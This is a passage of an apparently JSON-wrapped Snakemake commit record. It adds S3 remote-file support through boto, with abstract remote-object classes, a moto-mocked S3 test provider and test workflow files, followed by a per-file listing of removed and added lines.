self.remote_output:\n+            if (f.exists_remote and f.exists_local) and (f.mtime > f.mtime_local):\n+                files.add(f)\n+        return files\n+\n+    @property\n+    def remote_output_older_than_local(self):\n+        files = set()\n+        for f in self.remote_output:\n+            if (f.exists_remote and f.exists_local) and (f.mtime < f.mtime_local):\n+                files.add(f)\n+        return files\n+\n+    def transfer_updated_files(self):\n+        for f in self.remote_output_older_than_local | self.remote_input_older_than_local:\n+            f.upload_to_remote()\n+\n+        for f in self.remote_output_newer_than_local | self.remote_input_newer_than_local:\n+            f.download_from_remote()\n+    \n+    @property\n+    def files_to_download(self):\n+        toDownload = set()\n+\n+        for f in self.input:\n+            if f.is_remote:\n+                if not f.exists_local and f.exists_remote:\n+                    toDownload.add(f)\n+\n+        toDownload = toDownload | self.remote_input_newer_than_local\n+        return toDownload\n+\n+    @property\n+    def files_to_upload(self):\n+        return self.missing_remote_input & self.remote_input_older_than_local\n+\n     @property\n     def existing_output(self):\n         return filter(lambda f: f.exists, self.expanded_output)\n@@ -231,6 +360,10 @@ def prepare(self):\n                 os.remove(f)\n         for f, f_ in zip(self.output, self.rule.output):\n             f.prepare()\n+\n+        for f in self.files_to_download:\n+            f.download_from_remote()\n+\n         for f in self.log:\n             f.prepare()\n         if self.benchmark:\n@@ -239,6 +372,8 @@ def prepare(self):\n     def cleanup(self):\n         \"\"\" Cleanup output files. \"\"\"\n         to_remove = [f for f in self.expanded_output if f.exists]\n+\n+        to_remove.extend([f for f in self.remote_input if f.exists])\n         if to_remove:\n             logger.info(\"Removing output files of failed job {}\"\n                         \" since they might be corrupted:\\n{}\".format(\n@@ -246,6 +381,23 @@ def cleanup(self):\n             for f in to_remove:\n                 f.remove()\n \n+            self.rmdir_empty_remote_dirs()\n+\n+    @property\n+    def empty_remote_dirs(self):\n+        remote_files = [f for f in (set(self.output) | set(self.input)) if f.is_remote]\n+        emptyDirsToRemove = set(os.path.dirname(f) for f in remote_files if not len(os.listdir(os.path.dirname(f))))\n+        return emptyDirsToRemove\n+\n+    def rmdir_empty_remote_dirs(self):\n+        for d in self.empty_remote_dirs:\n+            pathToDel = d\n+            while len(pathToDel) > 0 and len(os.listdir(pathToDel)) == 0:\n+                logger.info(\"rmdir empty dir: {}\".format(pathToDel))\n+                os.rmdir(pathToDel)\n+                pathToDel = os.path.dirname(pathToDel)\n+\n+\n     def format_wildcards(self, string, **variables):\n         \"\"\" Format a string with variables from the job. \"\"\"\n         _variables = dict()\ndiff --git a/snakemake/remote_providers/RemoteObjectProvider.py b/snakemake/remote_providers/RemoteObjectProvider.py\nnew file mode 100644\nindex 0000000..b040e87\n--- /dev/null\n+++ b/snakemake/remote_providers/RemoteObjectProvider.py\n@@ -0,0 +1,50 @@\n+__author__ = \"Christopher Tomkins-Tinch\"\n+__copyright__ = \"Copyright 2015, Christopher Tomkins-Tinch\"\n+__email__ = \"tomkinsc@broadinstitute.org\"\n+__license__ = \"MIT\"\n+\n+from abc import ABCMeta, abstractmethod\n+\n+\n+class RemoteObject:\n+    \"\"\" This is an abstract class to be used to derive remote object classes for \n+        different cloud storage providers. For example, there could be classes for interacting with \n+        Amazon AWS S3 and Google Cloud Storage, both derived from this common base class.\n+    \"\"\"\n+    __metaclass__ = ABCMeta\n+\n+    def __init__(self, ioFile):\n+        self._iofile = ioFile\n+        self._file = ioFile._file\n+\n+    @abstractmethod\n+    def file(self):\n+        pass\n+\n+    @abstractmethod\n+    def exists(self):\n+        pass\n+\n+    @abstractmethod\n+    def mtime(self):\n+        pass\n+\n+    @abstractmethod\n+    def size(self):\n+        pass\n+\n+    @abstractmethod\n+    def download(self, *args, **kwargs):\n+        pass\n+\n+    @abstractmethod\n+    def upload(self, *args, **kwargs):\n+        pass\n+\n+    @abstractmethod\n+    def list(self, *args, **kwargs):\n+        pass\n+\n+    @abstractmethod\n+    def name(self, *args, **kwargs):\n+        pass\ndiff --git a/snakemake/remote_providers/S3.py b/snakemake/remote_providers/S3.py\nnew file mode 100644\nindex 0000000..77b15ea\n--- /dev/null\n+++ b/snakemake/remote_providers/S3.py\n@@ -0,0 +1,90 @@\n+__author__ = \"Christopher Tomkins-Tinch\"\n+__copyright__ = \"Copyright 2015, Christopher Tomkins-Tinch\"\n+__email__ = \"tomkinsc@broadinstitute.org\"\n+__license__ = \"MIT\"\n+\n+import re\n+\n+from snakemake.remote_providers.RemoteObjectProvider import RemoteObject\n+from snakemake.exceptions import MissingOutputException, WorkflowError, WildcardError, RemoteFileException, S3FileException\n+from snakemake.remote_providers.implementations.S3 import S3Helper\n+from snakemake.decorators import memoize\n+\n+import boto\n+\n+\n+class RemoteObject(RemoteObject):\n+    \"\"\" This is a class to interact with the AWS S3 object store.\n+    \"\"\"\n+\n+    def __init__(self, *args, **kwargs):\n+        super(RemoteObject, self).__init__(*args, **kwargs)\n+\n+        # pass all args but the first, which is the ioFile\n+        self._s3c = S3Helper(*args[1:], **kwargs)\n+\n+    # === Implementations of abstract class members ===\n+\n+    def file(self):\n+        return self._file\n+\n+    def exists(self):\n+        if self._matched_s3_path:\n+            return self._s3c.exists_in_bucket(self.s3_bucket, self.s3_key)\n+        else:\n+            raise S3FileException(\"The file cannot be parsed as an s3 path in form 'bucket/key': %s\" % self.file())\n+\n+    def mtime(self):\n+        if self.exists():\n+            return self._s3c.key_last_modified(self.s3_bucket, self.s3_key)\n+        else:\n+            raise S3FileException(\"The file does not seem to exist remotely: %s\" % self.file())\n+\n+    def size(self):\n+        if self.exists():\n+            return self._s3c.key_size(self.s3_bucket, self.s3_key)\n+        else:\n+            return self._iofile.size_local\n+\n+    def download(self):\n+        self._s3c.download_from_s3(self.s3_bucket, self.s3_key, self.file())\n+\n+    def upload(self):\n+        conn = boto.connect_s3()\n+        if self.size() > 5000:\n+            self._s3c.upload_to_s3_multipart(self.s3_bucket, self.file(), self.s3_key)\n+        else:\n+            self._s3c.upload_to_s3(self.s3_bucket, self.file(), self.s3_key)\n+\n+    @property\n+    def list(self):\n+        return self._s3c.list_keys(self.s3_bucket)\n+\n+    # === Related methods ===\n+\n+    @property\n+    def _matched_s3_path(self):\n+        return re.search(\"(?P<bucket>[^/]*)/(?P<key>.*)\", self.file())\n+\n+    @property\n+    def s3_bucket(self):\n+        if len(self._matched_s3_path.groups()) == 2:\n+            return self._matched_s3_path.group(\"bucket\")\n+        return None\n+\n+    @property\n+    def name(self):\n+        return self.s3_key\n+\n+    @property\n+    def s3_key(self):\n+        if len(self._matched_s3_path.groups()) == 2:\n+            return self._matched_s3_path.group(\"key\")\n+\n+    def s3_create_stub(self):\n+        if self._matched_s3_path:\n+            if not self.exists:\n+                self._s3c.download_from_s3(self.s3_bucket, self.s3_key, self.file, createStubOnly=True)\n+        else:\n+            raise S3FileException(\"The file to be downloaded cannot be parsed as an s3 path in form 'bucket/key': %s\" %\n+                                  self.file())\ndiff --git a/snakemake/remote_providers/__init__.py b/snakemake/remote_providers/__init__.py\nnew file mode 100644\nindex 0000000..8b13789\n--- /dev/null\n+++ b/snakemake/remote_providers/__init__.py\n@@ -0,0 +1 @@\n+\ndiff --git a/snakemake/remote_providers/implementations/S3.py b/snakemake/remote_providers/implementations/S3.py\nnew file mode 100644\nindex 0000000..c6cb622\n--- /dev/null\n+++ b/snakemake/remote_providers/implementations/S3.py\n@@ -0,0 +1,341 @@\n+__author__ = \"Christopher Tomkins-Tinch\"\n+__copyright__ = \"Copyright 2015, Christopher Tomkins-Tinch\"\n+__email__ = \"tomkinsc@broadinstitute.org\"\n+__license__ = \"MIT\"\n+\n+# built-ins\n+import os\n+import math\n+import time\n+import email.utils\n+from time import mktime\n+import datetime\n+from multiprocessing import Pool\n+\n+# third-party modules\n+import boto\n+from boto.s3.key import Key\n+from filechunkio import FileChunkIO\n+\n+\n+class S3Helper(object):\n+\n+    def __init__(self, *args, **kwargs):\n+        # as per boto, expects the environment variables to be set:\n+        # AWS_ACCESS_KEY_ID\n+        # AWS_SECRET_ACCESS_KEY\n+        # Otherwise these values need to be passed in as kwargs\n+        self.conn = boto.connect_s3(*args, **kwargs)\n+\n+    def upload_to_s3(\n+            self,\n+            bucketName,\n+            filePath,\n+            key=None,\n+            useRelativePathForKey=True,\n+            relativeStartDir=None,\n+            replace=False,\n+            reduced_redundancy=False,\n+            headers=None):\n+        \"\"\" Upload a file to S3\n+\n+            This function uploads a file to an AWS S3 bucket.\n+\n+            Args:\n+                bucketName: the name of the S3 bucket to use (bucket name only, not ARN)\n+                filePath: The path to the file to upload.\n+                key: The key to set for the file on S3. If not specified, this will default to the\n+                    name of the file.\n+                useRelativePathForKey: If set to True (default), and key is None, the S3 key will include slashes\n+                    representing the path of the file relative to the CWD. If False only the\n+                    file basename will be used for the key.\n+                relativeStartDir: The start dir to use for useRelativePathForKey. No effect if key is set.\n+                replace: If True a file with the same key will be replaced with the one being written\n+                reduced_redundancy: Sets the file to AWS reduced redundancy storage.\n+                headers: additional heads to pass to AWS\n+\n+            Returns: The key of the file on S3 if written, None otherwise\n+        \"\"\"\n+        filePath = os.path.realpath(os.path.expanduser(filePath))\n+\n+        assert bucketName, \"bucketName must be specified\"\n+        assert os.path.exists(filePath), \"The file path specified does not exist: %s\" % filePath\n+        assert os.path.isfile(filePath), \"The file path specified does not appear to be a file: %s\" % filePath\n+\n+        try:\n+            b = self.conn.get_bucket(bucketName)\n+        except:\n+            b = self.conn.create_bucket(bucketName)\n+\n+        k = Key(b)\n+\n+        if key:\n+            k.key = key\n+        else:\n+            if useRelativePathForKey:\n+                if relativeStartDir:\n+                    pathKey = os.path.relpath(filePath, relativeStartDir)\n+                else:\n+                    pathKey = os.path.relpath(filePath)\n+            else:\n+                pathKey = os.path.basename(filePath)\n+            k.key = pathKey\n+        try:\n+            bytesWritten = k.set_contents_from_filename(\n+                filePath,\n+                replace=replace,\n+                reduced_redundancy=reduced_redundancy,\n+                headers=headers)\n+            if bytesWritten:\n+                return k.key\n+            else:\n+                return None\n+        except:\n+            return None\n+\n+    def download_from_s3(\n+            self,\n+            bucketName,\n+            key,\n+            destinationPath=None,\n+            expandKeyIntoDirs=True,\n+            makeDestDirs=True,\n+            headers=None, createStubOnly=False):\n+        \"\"\" Download a file from s3\n+\n+            This function downloads an object from a specified AWS S3 bucket.\n+\n+            Args:\n+                bucketName: the name of the S3 bucket to use (bucket name only, not ARN)\n+                destinationPath: If specified, the file will be saved to this path, otherwise cwd.\n+                expandKeyIntoDirs: Since S3 keys can include slashes, if this is True (defult)\n+                    then S3 keys with slashes are expanded into directories on the receiving end.\n+                    If it is False, the key is passed to os.path.basename() to get the substring\n+                    following the last slash.\n+                makeDestDirs: If this is True (default) and the destination path includes directories\n+                    that do not exist, they will be created.\n+                headers: Additional headers to pass to AWS\n+\n+            Returns:\n+                The destination path of the downloaded file on the receiving end, or None if the filePath\n+                could not be downloaded\n+        \"\"\"\n+        assert bucketName, \"bucketName must be specified\"\n+        assert key, \"Key must be specified\"\n+\n+        b = self.conn.get_bucket(bucketName)\n+        k = Key(b)\n+\n+        if destinationPath:\n+            destinationPath = os.path.realpath(os.path.expanduser(destinationPath))\n+        else:\n+            if expandKeyIntoDirs:\n+                destinationPath = os.path.join(os.getcwd(), key)\n+            else:\n+                destinationPath = os.path.join(os.getcwd(), os.path.basename(key))\n+\n+        # if the destination path does not exist\n+        if not os.path.exists(os.path.dirname(destinationPath)) and makeDestDirs:\n+            os.makedirs(os.path.dirname(destinationPath))\n+\n+        k.key = key if key else os.path.basename(filePath)\n+\n+        try:\n+            if not createStubOnly:\n+                k.get_contents_to_filename(destinationPath, headers=headers)\n+            else:\n+                # just create an empty file with the right timestamps\n+                with open(destinationPath, 'wb') as fp:\n+                    modified_tuple = email.utils.parsedate_tz(k.last_modified)\n+                    modified_stamp = int(email.utils.mktime_tz(modified_tuple))\n+                    os.utime(fp.name, (modified_stamp, modified_stamp))\n+            return destinationPath\n+        except:\n+            return None\n+\n+    def _upload_part(self, bucketName, multipart_id, part_num, source_path, offset, bytesToWrite, numberOfRetries=5):\n+\n+        def _upload(retriesRemaining=numberOfRetries):\n+            try:\n+                b = self.conn.get_bucket(bucketName)\n+                for mp in b.get_all_multipart_uploads():\n+                    if mp.id == multipart_id:\n+                        with FileChunkIO(source_path, 'r', offset=offset, bytes=bytesToWrite) as fp:\n+                            mp.upload_part_from_file(fp=fp, part_num=part_num)\n+                        break\n+            except Exception() as e:\n+                if retriesRemaining:\n+                    _upload(retriesRemaining=retriesRemaining - 1)\n+                else:\n+                    raise e\n+\n+        _upload()\n+\n+    def upload_to_s3_multipart(\n+            self,\n+            bucketName,\n+            filePath,\n+            key=None,\n+            useRelativePathForKey=True,\n+            relativeStartDir=None,\n+            replace=False,\n+            reduced_redundancy=False,\n+            headers=None,\n+            parallel_processes=4):\n+        \"\"\" Upload a file to S3\n+\n+            This function uploads a file to an AWS S3 bucket.\n+\n+            Args:\n+                bucketName: the name of the S3 bucket to use (bucket name only, not ARN)\n+                filePath: The path to the file to upload.\n+                key: The key to set for the file on S3. If not specified, this will default to the\n+                    name of the file.\n+                useRelativePathForKey: If set to True (default), and key is None, the S3 key will include slashes\n+                    representing the path of the file relative to the CWD. If False only the\n+                    file basename will be used for the key.\n+                relativeStartDir: The start dir to use for useRelativePathForKey. No effect if key is set.\n+                replace: If True a file with the same key will be replaced with the one being written\n+                reduced_redundancy: Sets the file to AWS reduced redundancy storage.\n+                headers: additional heads to pass to AWS\n+                parallel_processes: Number of concurrent uploads\n+\n+            Returns: The key of the file on S3 if written, None otherwise\n+        \"\"\"\n+        filePath = os.path.realpath(os.path.expanduser(filePath))\n+\n+        assert bucketName, \"bucketName must be specified\"\n+        assert os.path.exists(filePath), \"The file path specified does not exist: %s\" % filePath\n+        assert os.path.isfile(filePath), \"The file path specified does not appear to be a file: %s\" % filePath\n+\n+        try:\n+            b = self.conn.get_bucket(bucketName)\n+        except:\n+            b = self.conn.create_bucket(bucketName)\n+\n+        pathKey = None\n+        if key:\n+            pathKey = key\n+        else:\n+            if useRelativePathForKey:\n+                if relativeStartDir:\n+                    pathKey = os.path.relpath(filePath, relativeStartDir)\n+                else:\n+                    pathKey = os.path.relpath(filePath)\n+            else:\n+                pathKey = os.path.basename(filePath)\n+\n+        mp = b.initiate_multipart_upload(pathKey, headers=headers)\n+\n+        sourceSize = os.stat(filePath).st_size\n+\n+        bytesPerChunk = 52428800  # 50MB = 50 * 1024 * 1024\n+        chunkCount = int(math.ceil(sourceSize / float(bytesPerChunk)))\n+\n+        pool = Pool(processes=parallel_processes)\n+        for i in range(chunkCount):\n+            offset = i * bytesPerChunk\n+            remainingBytes = sourceSize - offset\n+            bytesToWrite = min([bytesPerChunk, remainingBytes])\n+            partNum = i + 1\n+            pool.apply_async(self._upload_part, [bucketName, mp.id, partNum, filePath, offset, bytesToWrite])\n+        pool.close()\n+        pool.join()\n+\n+        if len(mp.get_all_parts()) == chunkCount:\n+            mp.complete_upload()\n+            try:\n+                key = b.get_key(pathKey)\n+                return key.key\n+            except:\n+                return None\n+        else:\n+            mp.cancel_upload()\n+            return None\n+\n+    def delete_from_bucket(self, bucketName, key, headers=None):\n+        \"\"\" Delete a file from s3\n+\n+            This function deletes an object from a specified AWS S3 bucket.\n+\n+            Args:\n+                bucketName: the name of the S3 bucket to use (bucket name only, not ARN)\n+                key: the key of the object to delete from the bucket\n+                headers: Additional headers to pass to AWS\n+\n+            Returns:\n+                The name of the object deleted\n+        \"\"\"\n+        assert bucketName, \"bucketName must be specified\"\n+        assert key, \"Key must be specified\"\n+\n+        b = self.conn.get_bucket(bucketName)\n+        k = Key(b)\n+        k.key = key\n+        ret = k.delete(headers=headers)\n+        return ret.name\n+\n+    def exists_in_bucket(self, bucketName, key, headers=None):\n+        \"\"\" Returns whether the key exists in the bucket\n+\n+            Args:\n+                bucketName: the name of the S3 bucket to use (bucket name only, not ARN)\n+                key: the key of the object to delete from the bucket\n+                headers: Additional headers to pass to AWS\n+\n+            Returns:\n+                True | False\n+        \"\"\"\n+        assert bucketName, \"bucketName must be specified\"\n+        assert key, \"Key must be specified\"\n+\n+        b = self.conn.get_bucket(bucketName)\n+        k = Key(b)\n+        k.key = key\n+        return k.exists(headers=headers)\n+\n+    def key_size(self, bucketName, key, headers=None):\n+        \"\"\" Returns the size of a key based on a HEAD request\n+\n+            Args:\n+                bucketName: the name of the S3 bucket to use (bucket name only, not ARN)\n+                key: the key of the object to delete from the bucket\n+                headers: Additional headers to pass to AWS\n+\n+            Returns:\n+                Size in kb\n+        \"\"\"\n+        assert bucketName, \"bucketName must be specified\"\n+        assert key, \"Key must be specified\"\n+\n+        b = self.conn.get_bucket(bucketName)\n+        k = b.lookup(key)\n+\n+        return k.size\n+\n+    def key_last_modified(self, bucketName, key, headers=None):\n+        \"\"\" Returns a timestamp of a key based on a HEAD request\n+\n+            Args:\n+                bucketName: the name of the S3 bucket to use (bucket name only, not ARN)\n+                key: the key of the object to delete from the bucket\n+                headers: Additional headers to pass to AWS\n+\n+            Returns:\n+                timestamp\n+        \"\"\"\n+        assert bucketName, \"bucketName must be specified\"\n+        assert key, \"Key must be specified\"\n+\n+        b = self.conn.get_bucket(bucketName)\n+        k = b.lookup(key)\n+\n+        # email.utils parsing of timestamp mirrors boto whereas\n+        # time.strptime() can have TZ issues due to DST\n+        modified_tuple = email.utils.parsedate_tz(k.last_modified)\n+        epochTime = int(email.utils.mktime_tz(modified_tuple))\n+\n+        return epochTime\n+\n+    def list_keys(self, bucketName):\n+        return self.conn.get_bucket(bucketName).list()\ndiff --git a/snakemake/rules.py b/snakemake/rules.py\nindex 3608167..5324eeb 100644\n--- a/snakemake/rules.py\n+++ b/snakemake/rules.py\n@@ -95,7 +95,12 @@ def get_io(rule):\n             if f in dynamic_io:\n                 try:\n                     for e in reversed(expand(f, zip, **wildcards)):\n-                        expansion[i].append(IOFile(e, rule=branch))\n+                        # need to clone the flags so intermediate\n+                        # dynamic remote file paths are expanded and \n+                        # removed appropriately\n+                        ioFile = IOFile(e, rule=branch)\n+                        ioFile.clone_flags(f)\n+                        expansion[i].append(ioFile)\n                 except KeyError:\n                     return None\n \ndiff --git a/snakemake/workflow.py b/snakemake/workflow.py\nindex b035bc3..833bd90 100644\n--- a/snakemake/workflow.py\n+++ b/snakemake/workflow.py\n@@ -23,7 +23,7 @@\n from snakemake.scheduler import JobScheduler\n from snakemake.parser import parse\n import snakemake.io\n-from snakemake.io import protected, temp, temporary, expand, dynamic, glob_wildcards, flag, not_iterable, touch\n+from snakemake.io import protected, temp, temporary, expand, dynamic, remote, glob_wildcards, glob_wildcards_remote, flag, not_iterable, touch\n from snakemake.persistence import Persistence\n from snakemake.utils import update_config\n \ndiff --git a/tests/test_remote/S3Mocked.py b/tests/test_remote/S3Mocked.py\nnew file mode 100644\nindex 0000000..d8cc489\n--- /dev/null\n+++ b/tests/test_remote/S3Mocked.py\n@@ -0,0 +1,103 @@\n+__author__ = \"Christopher Tomkins-Tinch\"\n+__copyright__ = \"Copyright 2015, Christopher Tomkins-Tinch\"\n+__email__ = \"tomkinsc@broadinstitute.org\"\n+__license__ = \"MIT\"\n+\n+# built-ins\n+import os, sys\n+from contextlib import contextmanager\n+import pickle\n+import time\n+import threading\n+\n+# third-party\n+import boto\n+from moto import mock_s3\n+\n+# intra-module\n+from snakemake.remote_providers.S3 import RemoteObject as S3RemoteObject\n+from snakemake.remote_providers.implementations.S3 import S3Helper\n+from snakemake.decorators import decAllMethods\n+\n+def noop():\n+    pass\n+\n+def pickledMotoWrapper(func):\n+    \"\"\"\n+        This is a class decorator that in turn decorates all methods within\n+        a class to mock out boto calls with moto-simulated ones.\n+        Since the moto backends are not presistent across calls by default, \n+        the wrapper also pickles the bucket state after each function call,\n+        and restores it before execution. This way uploaded files are available\n+        for follow-on tasks. Since snakemake may execute with multiple threads\n+        it also waits for the pickled bucket state file to be available before\n+        loading it in. This is a hackey alternative to using proper locks,\n+        but works ok in practice.\n+    \"\"\"\n+    def wrapper_func(self, *args, **kwargs):\n+        motoContextFile = \"motoState.p\"\n+\n+        motoContext = mock_s3()\n+\n+        # load moto buckets from pickle\n+        if os.path.isfile(motoContextFile) and os.path.getsize(motoContextFile) > 0:\n+            with file_lock(motoContextFile):\n+                with open( motoContextFile, \"rb\" ) as f:\n+                    motoContext.backends[\"global\"].buckets = pickle.load( f )\n+\n+        motoContext.backends[\"global\"].reset = noop\n+\n+        mockedFunction = motoContext(func)\n+\n+        retval = mockedFunction(self, *args, **kwargs)\n+\n+        with file_lock(motoContextFile):\n+            with open( motoContextFile, \"wb\" ) as f:\n+                pickle.dump(motoContext.backends[\"global\"].buckets, f)\n+\n+        return retval\n+    return wrapper_func\n+\n+@decAllMethods(pickledMotoWrapper, prefix=None)\n+class RemoteObject(S3RemoteObject):\n+    \"\"\" \n+        This is a derivative of the S3 remote provider that mocks\n+        out boto-based S3 calls using the \"moto\" Python package.\n+        Only the initializer is different; it \"uploads\" the input \n+        test file to the moto-simulated bucket at the start.\n+    \"\"\"\n+\n+    def __init__(self, *args, **kwargs):\n+        bucketName = 'test-remote-bucket'\n+        testFile = \"test.txt\"\n+\n+        conn = boto.connect_s3()\n+        if bucketName not in [b.name for b in conn.get_all_buckets()]:\n+            conn.create_bucket(bucketName)\n+\n+        # \"Upload\" files that should be in S3 before tests...\n+        s3c = S3Helper()\n+        if not s3c.exists_in_bucket(bucketName, testFile):\n+            s3c.upload_to_s3(bucketName, testFile)\n+\n+        return super(RemoteObject, self).__init__(*args, **kwargs)\n+\n+\n+# ====== Helpers =====\n+\n+@contextmanager\n+def file_lock(filepath):\n+    lock_file = filepath + \".lock\"\n+\n+    while os.path.isfile(lock_file):\n+        time.sleep(0.1)\n+\n+    with open(lock_file, 'w') as f:\n+        f.write(\"1\")\n+\n+    try:\n+        yield\n+    finally:\n+        if os.path.isfile(lock_file):\n+            os.remove(lock_file)\n+\ndiff --git a/tests/test_remote/Snakefile b/tests/test_remote/Snakefile\nnew file mode 100644\nindex 0000000..b2e1298\n--- /dev/null\n+++ b/tests/test_remote/Snakefile\n@@ -0,0 +1,49 @@\n+import re, os, sys\n+\n+import S3Mocked as S3Mocked\n+\n+#remote dynamic file test\n+\n+# This makes use of a special provider that mocks up S3 using the moto\n+# library so that boto calls hit local \"buckets\"\n+\n+rule all:\n+    input:\n+        # only keeping the file so we can copy it out to the cwd\n+        remote(\"test-remote-bucket/out.txt\", keep=True, provider=S3Mocked, additional_kwargs={})\n+    run:\n+        shell(\"mv test-remote-bucket/out.txt ./\")\n+\n+rule split:\n+    input: remote('test-remote-bucket/test.txt', keep=False, provider=S3Mocked, additional_kwargs={})\n+    output: remote(dynamic('test-remote-bucket/prefix{split_id}.txt'), provider=S3Mocked, additional_kwargs={})\n+    run:\n+        shell('split -l 2 {input} test-remote-bucket/prefix')\n+        for f in os.listdir(os.getcwd()+\"/test-remote-bucket\"):\n+            if re.search('prefix[a-z][a-z]', f):\n+                os.rename(\"test-remote-bucket/\"+f, \"test-remote-bucket/\"+f + '.txt')\n+\n+rule cut:\n+    input: remote('test-remote-bucket/prefix{split_id,[a-z][a-z]}.txt', provider=S3Mocked, additional_kwargs={})\n+    output: \n+        remote('test-remote-bucket/{split_id}_cut.txt', provider=S3Mocked, additional_kwargs={})\n+    shell: 'cut -f 1,2 {input} > {output}'\n+\n+rule merge:\n+    input: \n+        remote(dynamic('test-remote-bucket/{split_id}_cut.txt'), provider=S3Mocked, additional_kwargs={})\n+    output: \n+        remote('test-remote-bucket/out.txt', provider=S3Mocked, additional_kwargs={}),\n+    run: \n+        shell('echo {input}; cat {input} > {output}')\n+\n+\n+# after we finish, we need to remove the pickle storing\n+# the local moto \"buckets\" so we are starting fresh\n+# next time this test is run. This file is created by\n+# the moto wrapper defined in S3Mocked.py\n+onsuccess:\n+    shell(\"rm ./motoState.p\")\n+\n+onerror:\n+    shell(\"rm ./motoState.p\")\n\\ No newline at end of file\ndiff --git a/tests/test_benchmark/expected-results/test.benchmark.json b/tests/test_remote/__init__.py\nsimilarity index 100%\nrename from tests/test_benchmark/expected-results/test.benchmark.json\nrename to tests/test_remote/__init__.py\ndiff --git a/tests/test_remote/expected-results/out.txt b/tests/test_remote/expected-results/out.txt\nnew file mode 100644\nindex 0000000..818b3c5\n--- /dev/null\n+++ b/tests/test_remote/expected-results/out.txt\n@@ -0,0 +1,4 @@\n+0       1       2\n+0       1       2\n+0       1       2\n+0       1       2\ndiff --git a/tests/test_remote/test.txt b/tests/test_remote/test.txt\nnew file mode 100644\nindex 0000000..818b3c5\n--- /dev/null\n+++ b/tests/test_remote/test.txt\n@@ -0,0 +1,4 @@\n+0       1       2\n+0       1       2\n+0       1       2\n+0       1       2\ndiff --git a/tests/tests.py b/tests/tests.py\nold mode 100644\nnew mode 100755\nindex 37dd180..6b53573\n--- a/tests/tests.py\n+++ b/tests/tests.py\n@@ -265,6 +265,9 @@ def test_multiple_includes():\n def test_yaml_config():\n     run(dpath(\"test_yaml_config\"))\n \n+def test_remote():\n+   run(dpath(\"test_remote\"))\n+\n \n def test_cluster_sync():\n     run(dpath(\"test14\"),\n", "files": {"/snakemake/dag.py": {"changes": [{"diff": "\n from functools import partial, lru_cache\n from operator import itemgetter, attrgetter\n \n-from snakemake.io import IOFile, _IOFile, PeriodicityDetector, wait_for_files\n+from snakemake.io import IOFile, _IOFile, PeriodicityDetector, wait_for_files, is_flagged\n from snakemake.jobs import Job, Reason\n from snakemake.exceptions import RuleException, MissingInputException\n from snakemake.exceptions import MissingRuleException, AmbiguousRuleException\n", "add": 1, "remove": 1, "filename": "/snakemake/dag.py", "badparts": ["from snakemake.io import IOFile, _IOFile, PeriodicityDetector, wait_for_files"], "goodparts": ["from snakemake.io import IOFile, _IOFile, PeriodicityDetector, wait_for_files, is_flagged"]}]}, "/snakemake/io.py": {"changes": [{"diff": "\n import stat\n import time\n import json\n+import functools\n from itertools import product, chain\n from collections import Iterable, namedtuple\n-from snakemake.exceptions import MissingOutputException, WorkflowError, WildcardError\n+from snakemake.exceptions import MissingOutputException, WorkflowError, WildcardError, RemoteFileException, S3FileException\n from snakemake.logging import logger\n-\n+import snakemake.remote_providers.S3 as S3\n \n def lstat(f):\n     return os.stat(f, follow_symlinks=os.stat not in os.supports_follow_symlinks)\n", "add": 3, "remove": 2, "filename": "/snakemake/io.py", "badparts": ["from snakemake.exceptions import MissingOutputException, WorkflowError, WildcardError"], "goodparts": ["import functools", "from snakemake.exceptions import MissingOutputException, WorkflowError, WildcardError, RemoteFileException, S3FileException", "import snakemake.remote_providers.S3 as S3"]}, {"diff": "\n                              \"may not be used directly.\")\n \n     @property\n+    @_referToRemote\n     def exists(self):\n         return os.path.exists(self.file)\n \n     @property\n-    def protected(self):\n-        return self.exists and not os.access(self.file, os.W_OK)\n+    def exists_local(self):\n+        return os.path.exists(self.file)\n+\n+    @property\n+    def exists_remote(self):\n+        return (self.is_remote and self.remote_object.exists())\n+    \n \n     @property\n+    def protected(self):\n+        return self.exists_local and not os.access(self.file, os.W_OK)\n+    \n+    @property\n+    @_referToRemote\n     def mtime(self):\n+        return lstat(self.file).st_mtime\n+\n+    @property\n+    def flags(self):\n+        return getattr(self._file, \"flags\", {})\n+\n+    @property\n+    def mtime_local(self):\n         # do not follow symlinks for modification time\n         return lstat(self.file).st_mtime\n \n     @property\n+    @_referToRemote\n     def size(self):\n         # follow symlinks but throw error if invalid\n         self.check_broken_symlink()\n         return os.path.getsize(self.file)\n \n+    @property\n+    def size_local(self):\n+        # follow symlinks but throw error if invalid\n+        self.check_broken_symlink()\n+        return os.path.getsize(self.file)\n+\n     def check_broken_symlink(self):\n         \"\"\" Raise WorkflowError if file is a broken symlink. \"\"\"\n-        if not self.exists and lstat(self.file):\n+        if not self.exists_local and lstat(self.file):\n             raise WorkflowError(\"File {} seems to be a broken symlink.\".format(self.file))\n \n     def is_newer(self, time):\n         return self.mtime > time\n \n+    def download_from_remote(self):\n+        logger.info(\"Downloading from remote: {}\".format(self.file))\n+\n+        if self.is_remote and self.remote_object.exists():\n+            self.remote_object.download()\n+        else:\n+            raise RemoteFileException(\"The file to be downloaded does not seem to exist remotely.\")\n+ \n+    def upload_to_remote(self):\n+        logger.info(\"Uploading to remote: {}\".format(self.file))\n+\n+        if self.is_remote and not self.remote_object.exists():\n+            self.remote_object.upload()\n+        else:\n+            raise RemoteFileException(\"The file to be uploaded does not seem to exist remotely.\")\n+\n     def prepare(self):\n         path_until_wildcard = re.split(self.dynamic_fill, self.file)[0]\n         dir = os.path.dirname(path_until_wildcard)\n", "add": 45, "remove": 3, "filename": "/snakemake/io.py", "badparts": ["    def protected(self):", "        return self.exists and not os.access(self.file, os.W_OK)", "        if not self.exists and lstat(self.file):"], "goodparts": ["    @_referToRemote", "    def exists_local(self):", "        return os.path.exists(self.file)", "    @property", "    def exists_remote(self):", "        return (self.is_remote and self.remote_object.exists())", "    def protected(self):", "        return self.exists_local and not os.access(self.file, os.W_OK)", "    @property", "    @_referToRemote", "        return lstat(self.file).st_mtime", "    @property", "    def flags(self):", "        return getattr(self._file, \"flags\", {})", "    @property", "    def mtime_local(self):", "    @_referToRemote", "    @property", "    def size_local(self):", "        self.check_broken_symlink()", "        return os.path.getsize(self.file)", "        if not self.exists_local and lstat(self.file):", "    def download_from_remote(self):", "        logger.info(\"Downloading from remote: {}\".format(self.file))", "        if self.is_remote and self.remote_object.exists():", "            self.remote_object.download()", "        else:", "            raise RemoteFileException(\"The file to be downloaded does not seem to exist remotely.\")", "    def upload_to_remote(self):", "        logger.info(\"Uploading to remote: {}\".format(self.file))", "        if self.is_remote and not self.remote_object.exists():", "            self.remote_object.upload()", "        else:", "            raise RemoteFileException(\"The file to be uploaded does not seem to exist remotely.\")"]}, {"diff": "\n     def 